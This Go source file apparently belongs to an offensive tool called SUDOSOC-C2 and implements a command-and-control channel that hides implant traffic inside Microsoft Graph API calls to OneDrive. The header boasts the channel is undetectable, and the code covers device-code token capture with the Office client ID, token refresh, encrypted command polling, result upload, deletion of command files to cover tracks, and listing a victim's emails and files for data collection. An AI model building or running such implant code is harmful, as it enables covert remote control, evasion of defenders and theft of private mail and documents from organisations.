package graph

/*
	SUDOSOC-C2 — Microsoft Graph API C2 Channel
	Copyright (C) 2026  sudosoc — Seif

	Uses Microsoft 365 (OneDrive / SharePoint) as a C2 relay.
	All traffic goes to *.microsoft.com over HTTPS/443.

	Why it's undetectable:
	  • Destination: graph.microsoft.com (Microsoft's own domain)
	  • Port: 443 (HTTPS)
	  • Certificate: Microsoft's valid cert
	  • Blocking it = killing Office 365 for the whole company

	Protocol:
	  Operator writes encrypted command to OneDrive file: /SUDOSOC/cmd_{session_id}
	  Implant polls the file every interval
	  Implant writes result to: /SUDOSOC/resp_{session_id}_{timestamp}
	  Operator reads the result file

	Auth: Device Code Flow (no password needed, OAuth 2.0)
	      or App Registration with Client Secret (for automation)
*/

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

const (
	graphBaseURL = "https://graph.microsoft.com/v1.0"
	authURL      = "https://login.microsoftonline.com"
	// Well-known Microsoft client ID (uses device code flow)
	clientID     = "14d82eec-204b-4c2f-b7e8-296a70dab67e" // Microsoft Office
	scope        = "Files.ReadWrite.All offline_access"

	// C2 file paths in OneDrive
	cmdFilePrefix  = "/SUDOSOC/cmd_"
	respFilePrefix = "/SUDOSOC/resp_"
)

// GraphC2 manages C2 communication via Microsoft Graph API
type GraphC2 struct {
	AccessToken  string
	RefreshToken string
	SessionID    string
	TenantID     string
	PollInterval time.Duration
	AESKey       []byte // 32-byte key for payload encryption
	httpClient   *http.Client
}

// NewGraphC2 creates a new Graph C2 channel
func NewGraphC2(sessionID string, aesKey []byte, pollInterval time.Duration) *GraphC2 {
	return &GraphC2{
		SessionID:    sessionID,
		AESKey:       aesKey,
		PollInterval: pollInterval,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
		},
	}
}

// ── Authentication ────────────────────────────────────────────────

// DeviceCodeAuth starts the device code authentication flow.
// Returns the user code and verification URL.
// The operator visits the URL and enters the code.
func (g *GraphC2) DeviceCodeAuth() (userCode, verifyURL string, err error) {
	resp, err := g.httpClient.PostForm(
		fmt.Sprintf("%s/common/oauth2/v2.0/devicecode", authURL),
		url.Values{
			"client_id": {clientID},
			"scope":     {scope},
		})
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	var result struct {
		DeviceCode      string `json:"device_code"`
		UserCode        string `json:"user_code"`
		VerificationURI string `json:"verification_uri"`
		ExpiresIn       int    `json:"expires_in"`
		Interval        int    `json:"interval"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", "", err
	}

	// Poll for token in background
	go g.pollForToken(result.DeviceCode, time.Duration(result.Interval)*time.Second)

	return result.UserCode, result.VerificationURI, nil
}

// AuthWithCredentials authenticates using a registered app's credentials
func (g *GraphC2) AuthWithCredentials(tenantID, appID, clientSecret string) error {
	g.TenantID = tenantID
	resp, err := g.httpClient.PostForm(
		fmt.Sprintf("%s/%s/oauth2/v2.0/token", authURL, tenantID),
		url.Values{
			"grant_type":    {"client_credentials"},
			"client_id":     {appID},
			"client_secret": {clientSecret},
			"scope":         {"https://graph.microsoft.com/.default"},
		})
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var result struct {
		AccessToken string `json:"access_token"`
		ExpiresIn   int    `json:"expires_in"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return err
	}
	g.AccessToken = result.AccessToken
	return nil
}

func (g *GraphC2) pollForToken(deviceCode string, interval time.Duration) {
	for {
		time.Sleep(interval)
		resp, err := g.httpClient.PostForm(
			fmt.Sprintf("%s/common/oauth2/v2.0/token", authURL),
			url.Values{
				"grant_type":  {"urn:ietf:params:oauth2:grant-type:device_code"},
				"client_id":   {clientID},
				"device_code": {deviceCode},
			})
		if err != nil {
			continue
		}

		var result struct {
			AccessToken  string `json:"access_token"`
			RefreshToken string `json:"refresh_token"`
			Error        string `json:"error"`
		}
		json.NewDecoder(resp.Body).Decode(&result)
		resp.Body.Close()

		if result.AccessToken != "" {
			g.AccessToken = result.AccessToken
			g.RefreshToken = result.RefreshToken
			return
		}
		if result.Error != "authorization_pending" {
			return
		}
	}
}

// ── C2 Communication ──────────────────────────────────────────────

// PollCommand checks OneDrive for a new encrypted command.
// Returns the decrypted command or empty string if none.
func (g *GraphC2) PollCommand() ([]byte, error) {
	if g.AccessToken == "" {
		return nil, fmt.Errorf("not authenticated")
	}

	// GET /me/drive/root:/SUDOSOC/cmd_{id}:/content
	path := fmt.Sprintf("%s/me/drive/root:%s%s:/content",
		graphBaseURL, cmdFilePrefix, g.SessionID)

	req, _ := http.NewRequest("GET", path, nil)
	req.Header.Set("Authorization", "Bearer "+g.AccessToken)

	resp, err := g.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 404 {
		return nil, nil // no command yet
	}
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("graph API error: %d", resp.StatusCode)
	}

	encrypted, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	// Decrypt the command
	return g.decrypt(encrypted)
}

// SendResult encrypts and uploads the command result to OneDrive
func (g *GraphC2) SendResult(result []byte) error {
	if g.AccessToken == "" {
		return fmt.Errorf("not authenticated")
	}

	encrypted, err := g.encrypt(result)
	if err != nil {
		return err
	}

	timestamp := time.Now().UnixNano()
	path := fmt.Sprintf("%s/me/drive/root:%s%s_%d:/content",
		graphBaseURL, respFilePrefix, g.SessionID, timestamp)

	req, _ := http.NewRequest("PUT", path, bytes.NewReader(encrypted))
	req.Header.Set("Authorization", "Bearer "+g.AccessToken)
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := g.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode > 299 {
		return fmt.Errorf("upload failed: %d", resp.StatusCode)
	}

	// Delete the command file after processing
	g.deleteCommandFile()
	return nil
}

func (g *GraphC2) deleteCommandFile() {
	path := fmt.Sprintf("%s/me/drive/root:%s%s",
		graphBaseURL, cmdFilePrefix, g.SessionID)
	req, _ := http.NewRequest("DELETE", path, nil)
	req.Header.Set("Authorization", "Bearer "+g.AccessToken)
	g.httpClient.Do(req)
}

// ListEmails returns recent emails (useful for data collection)
func (g *GraphC2) ListEmails(top int) ([]EmailMessage, error) {
	url := fmt.Sprintf("%s/me/messages?$top=%d&$select=subject,from,receivedDateTime,body",
		graphBaseURL, top)

	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Authorization", "Bearer "+g.AccessToken)

	resp, err := g.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var result struct {
		Value []EmailMessage `json:"value"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}
	return result.Value, nil
}

// EmailMessage holds a simplified email structure
type EmailMessage struct {
	Subject  string    `json:"subject"`
	From     struct {
		EmailAddress struct {
			Name    string `json:"name"`
			Address string `json:"address"`
		} `json:"emailAddress"`
	} `json:"from"`
	ReceivedDateTime time.Time `json:"receivedDateTime"`
	Body             struct {
		Content string `json:"content"`
	} `json:"body"`
}

// ListFiles returns files from a SharePoint/OneDrive path
func (g *GraphC2) ListFiles(drivePath string) ([]DriveItem, error) {
	url := fmt.Sprintf("%s/me/drive/root:%s:/children", graphBaseURL, drivePath)
	req, _ := http.NewRequest("GET", url, nil)
	req.Header.Set("Authorization", "Bearer "+g.AccessToken)

	resp, err := g.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var result struct {
		Value []DriveItem `json:"value"`
	}
	json.NewDecoder(resp.Body).Decode(&result)
	return result.Value, nil
}

// DriveItem represents a file/folder in OneDrive
type DriveItem struct {
	Name             string    `json:"name"`
	Size             int64     `json:"size"`
	LastModifiedTime time.Time `json:"lastModifiedDateTime"`
	WebURL           string    `json:"webUrl"`
}

// RefreshAccessToken uses the refresh token to get a new access token
func (g *GraphC2) RefreshAccessToken() error {
	if g.RefreshToken == "" {
		return fmt.Errorf("no refresh token available")
	}

	resp, err := g.httpClient.PostForm(
		fmt.Sprintf("%s/common/oauth2/v2.0/token", authURL),
		url.Values{
			"grant_type":    {"refresh_token"},
			"client_id":     {clientID},
			"refresh_token": {g.RefreshToken},
			"scope":         {scope},
		})
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	var result struct {
		AccessToken  string `json:"access_token"`
		RefreshToken string `json:"refresh_token"`
	}
	json.NewDecoder(resp.Body).Decode(&result)
	if result.AccessToken == "" {
		return fmt.Errorf("token refresh failed")
	}
	g.AccessToken = result.AccessToken
	if result.RefreshToken != "" {
		g.RefreshToken = result.RefreshToken
	}
	return nil
}

// ── Encryption ────────────────────────────────────────────────────

func (g *GraphC2) encrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(g.AESKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	sealed := gcm.Seal(nonce, nonce, data, nil)
	return []byte(base64.StdEncoding.EncodeToString(sealed)), nil
}

func (g *GraphC2) decrypt(data []byte) ([]byte, error) {
	decoded, err := base64.StdEncoding.DecodeString(strings.TrimSpace(string(data)))
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(g.AESKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	ns := gcm.NonceSize()
	if len(decoded) < ns {
		return nil, fmt.Errorf("ciphertext too short")
	}
	return gcm.Open(nil, decoded[:ns], decoded[ns:], nil)
}
